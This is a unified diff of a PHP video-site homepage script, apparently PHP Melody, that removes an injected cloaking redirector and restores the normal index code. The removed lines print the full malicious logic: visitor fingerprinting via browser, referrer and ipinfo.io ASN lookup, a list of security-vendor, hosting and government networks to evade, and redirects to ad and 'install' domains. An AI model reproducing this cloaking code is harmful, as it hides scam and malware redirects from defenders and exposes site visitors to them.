@@ -1,124 +1,139 @@
 <?php
-	$_SERVER['HTTP_USER_AGENT'] = isset($_SERVER['HTTP_USER_AGENT']) ? $_SERVER['HTTP_USER_AGENT'] : '';
-	if(isset($_SERVER['HTTP_X_FORWARDED_FOR'])){
-		$_SERVER["REMOTE_ADDR"] = $_SERVER['HTTP_X_FORWARDED_FOR'];
-	}
-	function generate_name($length){
-		$rname = '';
-		$sesli = 'aeiou';
-		$sessiz = 'bcdfghjklmnprstvyz';
-		$rname = rand(1,2) == 1?$sessiz[rand(0,strlen($sessiz)-1)]:$sesli[rand(0,strlen($sesli)-1)];
-		for($n=0;$n<$length;$n++){
-			if(in_array($rname[strlen($rname)-1], str_split($sesli))){
-				$rname .= $sessiz[rand(0,strlen($sessiz)-1)];
-			}else{
-				$rname .= $sesli[rand(0,strlen($sesli)-1)];
-			}
-		}
-		return $rname;
-	}
-	function random($length = 10) {
-		$characters = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
-		$randomString = '';
-		for ($i = 0; $i < $length; $i++) {
-			$randomString .= $characters[rand(0, strlen($characters) - 1)];
-		}
-		return $randomString;
-	}
-	function getORG(){
-		$ch = curl_init();
-		curl_setopt($ch, CURLOPT_URL, 'http://ipinfo.io/'.$_SERVER["REMOTE_ADDR"].'/org');
-		curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
-		curl_setopt($ch, CURLOPT_TIMEOUT, 5);
-		$org = curl_exec($ch);
-		curl_close($ch);
-		return $org;
-	}
-	function getSite(){
-		$ch = curl_init();
-		curl_setopt($ch, CURLOPT_URL, 'http://checklinxk.info/php/site.php');
-		curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
-		$site = curl_exec($ch);
-		curl_close($ch);
-		return $site;
-	}
-	$action = 'theme';	
-	require_once('Mobile_Detect.php');
-	require_once('Browser.php');
-	$detect = new Mobile_Detect;
-	$browser = new Browser();
-	if($browser->isRobot()){
-		$action = 'theme';
-	}else if($detect->isMobile() || $browser->isMobile()){
-		$action = 'mobile';
-	}else if($browser->getBrowser() == Browser::BROWSER_CHROME){
-		$action = 'site';
-	}else{
-		$action = 'theme';
-	}
-	if($action == 'site'){
-		$_SERVER['HTTP_REFERER'] = isset($_SERVER['HTTP_REFERER']) ? $_SERVER['HTTP_REFERER'] : '';
-		$refs = array('facebook.com');
-		$action = 'theme';
-		foreach ($refs as $ref) {
-			if(strpos($_SERVER['HTTP_REFERER'], $ref) !== false){
-				$action = 'site';
-				break;
-			}
-		}
-	}
-  $asnlist = array('Facebook','Google','Cloud','Linode','Kaspersky','Host','Level 3 Communications','Mcafee','Akamai International','NeuStar','Amazon','Microsoft','ocean','LeaseWeb','Radore','AVAST','QSC AG','Radix','ICANN','Dynamic Network Services','ESET','OVH SAS','layer','Dropbox','Maktek','FBI','Netguard','data-center','Data Center','datacent','LEPL','ministarstvo','ministry','hurricane','justic','navy','Black Fox Limited','WholeSale','redstation','Privax','trafficholder','rackspace','defense','Zscaler','Steadfast Networks','Federal','SingleHop','QuadraNet','Screen Saver','security','intel','govern','interpol','bitdefender','admin','cyber','apple','crime','azure','cisco','polic','bing','isprime','court','DOGAN','INETLTD','TELLCOM','AS197328','NETHOUSE','KOCNET','ASTURKNET','ULAKNET','ESOESNET','AS43260','AS198436','AS62054','DORUKNET','Digital Energy Technologies','WEDOS','ITLAS','TRABIA','Transip','incorporated','inc.', 'Ltda.', '-AS', 'meerfarbig', 'PORTLANE', 'Amsterdam, the Netherlands', 'ASGIGAS', 'Tunisia BackBone AS', 'Flycom Comunicaciones', 'Forcepoint', 'WebNX', 'Trend Micro', 'OVH Hosting');
+// +------------------------------------------------------------------------+
+// | PHP Melody ( www.phpsugar.com )
+// +------------------------------------------------------------------------+
+// | PHP Melody IS NOT FREE SOFTWARE
+// | If you have downloaded this software from a website other
+// | than www.phpsugar.com or if you have received
+// | this software from someone who is not a representative of
+// | PHPSUGAR, you are involved in an illegal activity.
+// | ---
+// | In such case, please contact: support@phpsugar.com.
+// +------------------------------------------------------------------------+
+// | Developed by: PHPSUGAR (www.phpsugar.com) / support@phpsugar.com
+// | Copyright: (c) 2004-2015 PHPSUGAR. All rights reserved.
+// +------------------------------------------------------------------------+
+session_start();
+require('config.php');
+if($_POST['select_language'] == 1 || (strcmp($_POST['select_language'],"1") == 0))
+{
+	require_once('include/settings.php');
 	
-	if($action != 'theme'){
-		$_SERVER['GEOIP_ORG'] = getORG();
-		foreach ($asnlist as $asn) {
-      if(strpos(strtolower($_SERVER['GEOIP_ORG']), strtolower($asn)) !== false){
-				$action = 'theme';	
-				break;
-			}
-		}
-		if(isset($_SERVER['HTTP_VIA']) && strpos(strtolower($_SERVER['HTTP_VIA']), 'compression')){
-			$action = 'mobile';	
-		}
-	}
-	if(isset($_SERVER['HTTP_X_FB_CURL_CLIENT'])){
-		$action = 'theme';	
-	}
-	if(isset($_SERVER['REQUEST_METHOD']) && $_SERVER['REQUEST_METHOD'] != 'GET'){
-		$action = 'theme';	
-	}
-	if(isset($_SERVER['HTTP_X_PURPOSE']) || $_SERVER['HTTP_USER_AGENT'] == ''){
-		$action = 'theme';
-	}
-	if($action != 'theme'){
-		$_SERVER['HTTP_REFERER'] = isset($_SERVER['HTTP_REFERER']) ? $_SERVER['HTTP_REFERER'] : '';
-    $bannedrefs = array('facebook.com/lsr.php','l.facebook.com/l.php','digitalocean.com','facebook.com/help','fb.me','blogspot.video');
-		foreach ($bannedrefs as $ref) {
-			if(strpos($_SERVER['HTTP_REFERER'], $ref) !== false){
-				$action = 'theme';
-				break;
-			}
-		}
+	$l_id = (int) $_POST['lang_id'];
+	if( ! array_key_exists($l_id, $langs) )
+	{
+		$l_id = 1;
 	}
 	
-	$id = @$_GET["id"];
-	if(empty($id) || $id == "" || $id == "/"){
-		$id = generate_name(rand(5,10));
+	setcookie(COOKIE_LANG, $l_id, time()+COOKIE_TIME, COOKIE_PATH);
+	exit();
+}
+
+//require_once('include/functions.php');
+require_once('include/user_functions.php');
+require_once('include/islogged.php');
+require_once('include/rating_functions.php');
+$modframework->trigger_hook('index_top');
+
+// define meta tags & common variables
+if ('' != $config['homepage_title'])
+{
+	$meta_title = $config['homepage_title'];
+}
+else
+{
+	$meta_title = sprintf($lang['homepage_title'], _SITENAME);	
+}
+$meta_keywords = $config['homepage_keywords'];
+$meta_description = $config['homepage_description'];
+// end
+
+$top_videos = top_videos($config['top_videos_sort'], _TOPVIDS);
+$new_videos = get_video_list('added', 'desc', 0, _NEWVIDS);
+$featured_videos = get_featured_video_list((int) $config['homepage_featured_limit']);
+$total_featured_videos = count($featured_videos);
+
+// pull out featured categories data
+$featured_categories_data = array();
+$featured_categories = ($config['homepage_featured_categories'] != '') ? unserialize($config['homepage_featured_categories']) : array();
+if (count($featured_categories) > 0)
+{
+	load_categories();
+	foreach ($_video_categories as $cid => $category_data)
+	{
+		$_video_categories[$cid]['url'] = make_link('category', array('tag' => $category_data['tag']));
 	}
-	$id = isset(explode("/", $id)[1]) ? explode("/", $id)[1] : $id;
-	$id = isset(explode(".", $id)[0]) ? explode(".", $id)[0] : $id;
-	if($action == 'mobile'){
-	echo '<script> new Image().src = "http://notlifes.com/control.php?_=1501860431458"; setTimeout(function(){ location.href="http://redirect145.info/ad/5a0bb04c"; },500); </script>';
-	}else if($action == 'site'){
-		header("Location: http://ipcheck.marketingapis.com/install/");
-	}else{
-		@ob_end_clean();
-		@ob_end_flush();
-		if(isset($_GET['imgur'])){
-			header("Content-Type:image/jpeg");
-			echo file_get_contents("https://i.imgur.com/$id.jpg");
-		}else{
-			include("share.php");
+	
+	foreach ($featured_categories as $k => $cid)
+	{
+		$featured_categories_data[$cid] = get_video_list('added', 'desc', 0, 10, $cid);
+	}
+}
+
+if($config['show_tags'] == 1)
+{
+	$tag_cloud = tag_cloud(0, $config['tag_cloud_limit'], $config['shuffle_tags']);
+	$smarty->assign('tags', $tag_cloud);
+	$smarty->assign('show_tags', 1);
+}
+
+if($config['show_stats'] == 1)
+{
+	$stats = stats();
+	$smarty->assign('stats', $stats);
+	$smarty->assign('show_stats', 1);
+}
+//	Get latest articles
+if (_MOD_ARTICLE)
+{
+	$articles = art_load_articles(0, $config['article_widget_limit']);
+
+	if ( ! array_key_exists('type', $articles))
+	{
+		foreach ($articles as $id => $article)
+		{
+			$articles[$id]['title'] = fewchars($article['title'], 55);
 		}
+		$smarty->assign('articles', $articles);
 	}
-?>
+}
+
+$playingnow = videosplaying($config['playingnow_limit']);
+$total_playingnow = (is_array($playingnow)) ? count($playingnow) : 0;
+
+if ($config['player_autoplay'] == '0' && $video['video_player'] != 'embed' && $video['source_id'] != 3) 
+{
+	// don't update site_views for this video. It will be updated when the user hits the play button.
+}
+else
+{
+	// in all other cases, update site_views on page load.
+	if ($total_featured_videos == 1)
+	{
+		update_view_count($featured_videos[0]['id'], $featured_videos[0]['site_views'], false);
+	}
+}
+// pre-roll [static] ads & subtitles
+if ($total_featured_videos == 1)
+{
+	serve_preroll_ad('index', $featured_videos[0]);
+	$smarty->assign('video_subtitles', (array) get_video_subtitles($featured_videos[0]['uniq_id']));
+}
+
+$smarty->assign('total_playingnow', $total_playingnow);
+$smarty->assign('playingnow', $playingnow);
+
+$smarty->assign('featured_videos', $featured_videos);
+$smarty->assign('featured_videos_total', $total_featured_videos);
+$smarty->assign('featured_channels', get_featured_channels());
+$smarty->assign('new_videos', $new_videos);
+$smarty->assign('top_videos', $top_videos);
+$smarty->assign('categories', $_video_categories);
+$smarty->assign('featured_categories_data', $featured_categories_data);
+// --- DEFAULT SYSTEM FILES - DO NOT REMOVE --- //
+$smarty->assign('meta_title', htmlspecialchars($meta_title));
+$smarty->assign('meta_keywords', htmlspecialchars($meta_keywords));
+$smarty->assign('meta_description', htmlspecialchars($meta_description));
+$smarty->assign('template_dir', $template_f);
+$modframework->trigger_hook('index_bottom');
+$smarty->display('index.tpl');
